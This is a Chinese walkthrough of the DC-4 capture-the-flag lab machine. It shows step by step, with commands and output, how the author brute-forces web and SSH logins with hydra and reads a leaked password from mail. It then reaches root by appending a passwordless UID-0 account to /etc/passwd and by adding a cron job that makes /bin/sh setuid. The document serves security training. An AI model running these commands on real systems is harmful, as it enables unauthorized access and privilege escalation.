---
 title: DC-4靶机渗透实战
 date: 2020-02-05 13:21:48
 tags: 靶机渗透
 categories: 靶机渗透
---

### 靶机介绍

这次的靶机渗透实战是一个找寻靶机中的flag的过程，并以获得最终的flag为目标。
靶机下载地址:http://www.five86.com/dc-4.html

### 信息搜集
直接上nmap进行扫描
> nmap -sV -A 172.16.0.16 -oN dc.nmap 
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 8d:60:57:06:6c:27:e0:2f:76:2c:e6:42:c0:01:ba:25 (RSA)
|   256 e7:83:8c:d7:bb:84:f3:2e:e8:a2:5f:79:6f:8e:19:30 (ECDSA)
|_  256 fd:39:47:8a:5e:58:33:99:73:73:9e:22:7f:90:4f:4b (ED25519)
80/tcp open  http    nginx 1.15.10
|_http-server-header: nginx/1.15.10
|_http-title: System Tools
MAC Address: 00:0C:29:93:30:DE (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

![2020-2-5-13-24-16](https://raw.githubusercontent.com/bbkali/picbad/master/2020-2-5-13-24-16)

**可知开放22、80端口，linux主机 web是一个登录框 考虑万能密码 注入 爆破**
<!--more-->

### 渗透实战

1. 页面提示是admin的登录框，直接拿admin进行爆破
- 可以使用hydra、burpsuit爆破，以hydra为例
> hydra -l admin -P /usr/share/john/password.lst -f 172.16.0.16 http-post-form "/login.php:username=^USER^&password=^PASS^:S=logout" -vV
```
[VERBOSE] Page redirected to http://172.16.0.16/index.php
[VERBOSE] Page redirected to http://172.16.0.16/index.php
[VERBOSE] Page redirected to http://172.16.0.16/index.php
[80][http-post-form] host: 172.16.0.16   login: admin   password: happy
[STATUS] attack finished for 172.16.0.16 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
```
直接爆出账号密码
2. 同时用sqlmap简单测试下是否有注入漏洞
> sqlmap -u http://172.16.0.16/ --data "username=admin&password=admin" --thread 10 --batch --dbs
发现没有注入漏洞
3. 直接账号登录后台，有命令执行窗口，发现有4个用户
![2020-2-5-13-48-44](https://raw.githubusercontent.com/bbkali/picbad/master/2020-2-5-13-48-44)
> root charles jim sam
- 查看用户家目录文件,只有jim下有文件
```
You have selected: ls -R /home/

/home/:
charles
jim
sam

/home/charles:

/home/jim:
backups
mbox
test.sh

/home/jim/backups:
old-passwords.bak

/home/sam:

```
* 有个老密码字典，应该是提供给爆破ssh用
* mbox 猜测是有邮件信息
4. 拿着密码字典去爆破ssh
> hydra -L users.txt -P jimpass.txt ssh://172.16.0.16 -t 6 -f -vV
- 得到用户 jim 密码 jibril04，SSH登陆，登陆提示 邮件，查看/var/mail查看邮件内有charles的密码
```
[22][ssh] host: 172.16.0.16   login: jim   password: jibril04
```

```
im@dc-4:/var/mail$ cat jim 
From charles@dc-4 Sat Apr 06 21:15:46 2019
Return-path: <charles@dc-4>
Envelope-to: jim@dc-4
Delivery-date: Sat, 06 Apr 2019 21:15:46 +1000
Received: from charles by dc-4 with local (Exim 4.89)
        (envelope-from <charles@dc-4>)
        id 1hCjIX-0000kO-Qt
        for jim@dc-4; Sat, 06 Apr 2019 21:15:45 +1000
To: jim@dc-4
Subject: Holidays
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <E1hCjIX-0000kO-Qt@dc-4>
From: Charles <charles@dc-4>
Date: Sat, 06 Apr 2019 21:15:45 +1000
Status: O

Hi Jim,

I'm heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.

Password is:  ^xHhA&hvim0y

See ya,
Charle
```
- 查看test.sh文件，发现是个小脚本文件，猜测后续能用上
```
jim@dc-4:~$ cat test.sh 
#!/bin/bash
for i in {1..5}
do
 sleep 1
 echo "Learn bash they said."
 sleep 1
 echo "Bash is good they said."
done
 echo "But I'd rather bash my head against a brick wall."
hellwor
```
- 常规操作发现su是有权限的
```
jim@dc-4:~$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/passwd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/sbin/exim4
/bin/mount
/bin/umount
/bin/su
/bin/ping
jim@dc-4:~$ sudo -l
[sudo] password for jim: 
Sorry, user jim may not run sudo on dc-4.
```
5. 切换到charle用户中去,发现有teehee命令可以运行root权限
```
charles@dc-4:~$ sudo -l
Matching Defaults entries for charles on dc-4:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User charles may run the following commands on dc-4:
    (root) NOPASSWD: /usr/bin/teehee
```
- 查看teehee命令用法,这是一个将内容添加到文件的命令
```
charles@dc-4:~$ teehee --h
Usage: teehee [OPTION]... [FILE]...
Copy standard input to each FILE, and also to standard output.

  -a, --append              append to the given FILEs, do not overwrite
  -i, --ignore-interrupts   ignore interrupt signals
  -p                        diagnose errors writing to non pipes
      --output-error[=MODE]   set behavior on write error.  See MODE below
      --help     display this help and exit
      --version  output version information and exit

MODE determines behavior with write errors on the outputs:
  'warn'         diagnose errors writing to any output
  'warn-nopipe'  diagnose errors writing to any output not a pipe
  'exit'         exit on error writing to any output
  'exit-nopipe'  exit on error writing to any output not a pipe
The default MODE for the -p option is 'warn-nopipe'.
The default operation when --output-error is not specified, is to
exit immediately on error writing to a pipe, and diagnose errors
writing to non pipe outputs.

GNU coreutils online help: <http://www.gnu.org/software/coreutils/>
Full documentation at: <http://www.gnu.org/software/coreutils/tee>
or available locally via: info '(coreutils) tee invocation'
```
6. 提权方法，利用teehee加载内容到文件中获取root权限
* /etc/passwd文件
    - 新建一个具有和root一样大的权限的用户
    > echo "admin::0:0:admin::/bin/bash"|sudo teehee -a /etc/passwd
    > #[用户名]：[密码]：[UID]：[GID]：[身份描述]：[主目录]：[登录shell]
    - 直接拿到root权限获取到最终的flag文件
    ```
    charles@dc-4:~$ echo "admin::0:0:admin::/bin/bash"|sudo teehee -a /etc/passwd
        admin::0:0:admin::/bin/bash
        charles@dc-4:~$ cat /etc/passwd
        root:x:0:0:root:/root:/bin/bash
        daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
        bin:x:2:2:bin:/bin:/usr/sbin/nologin
        sys:x:3:3:sys:/dev:/usr/sbin/nologin
        sync:x:4:65534:sync:/bin:/bin/sync
        games:x:5:60:games:/usr/games:/usr/sbin/nologin
        man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
        lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
        mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
        news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
        uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
        proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
        www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
        backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
        list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
        irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
        gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
        nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
        systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
        systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
        systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
        systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
        _apt:x:104:65534::/nonexistent:/bin/false
        messagebus:x:105:109::/var/run/dbus:/bin/false
        sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
        nginx:x:107:111:nginx user,,,:/nonexistent:/bin/false
        charles:x:1001:1001:Charles,,,:/home/charles:/bin/bash
        jim:x:1002:1002:Jim,,,:/home/jim:/bin/bash
        sam:x:1003:1003:Sam,,,:/home/sam:/bin/bash
        Debian-exim:x:108:112::/var/spool/exim4:/bin/false
        admin::0:0:admin::/bin/bash
        charles@dc-4:~$ su admin
    root@dc-4:/home/charles# whoami
        root
    root@dc-4:/home/charles# cd /root
    root@dc-4:/root# ls
        flag.txt
    ```
* /etc/crontab文件
    - 通过teehee的sudo提升权限以 root身份写入crontab计划任务通过执行获取root权限
    > cat crontab # 可见文件有格式将授权命令写入该文件授权root bash
    ```
    charles@dc-4:/home/jim$ cat /etc/crontab
    # /etc/crontab: system-wide crontab
    # Unlike any other crontab you don't have to run the `crontab'
    # command to install the new version when you edit this file
    # and files in /etc/cron.d. These files also have username fields,
    # that none of the other crontabs do.

    SHELL=/bin/sh
    PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

    # m h dom mon dow user  command
    17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
    25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
    47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
    52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
    #
    ```
    > echo "* * * * * root chmod 4777 /bin/sh" | sudo teehee -a /etc/crontab 
    时间部分全部填写为*，默认这个定时任务每分钟执行一次。通过执行的脚本将 /bin/sh 的权限修改为4777，这样就可以在非root用户下执行它，并且执行期间拥有root权限。
    ```
    charles@dc-4:/home/jim$ ls -al /bin/sh
    lrwxrwxrwx 1 root root 4 Jan 24  2017 /bin/sh -> dash
    charles@dc-4:/home/jim$ /bin/sh
    # whoami
    root
    # ls /root
    flag.txt
    ```
最终打开的flag文件内容
```
root@dc-4:/root# cat flag.txt



888       888          888 888      8888888b.                             888 888 888 888 
888   o   888          888 888      888  "Y88b                            888 888 888 888 
888  d8b  888          888 888      888    888                            888 888 888 888 
888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 
888d88888b888 d8P  Y8b 888 888      888    888 d88""88b 888 "88b d8P  Y8b 888 888 888 888 
88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P 
8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      "   "   "   "  
888P     Y888  "Y8888  888 888      8888888P"   "Y88P"  888  888  "Y8888  888 888 888 888 


Congratulations!!!

Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those
who have provided feedback, and who have taken time to complete these little
challenges.

If you enjoyed this CTF, send me a tweet via @DCAU7.

```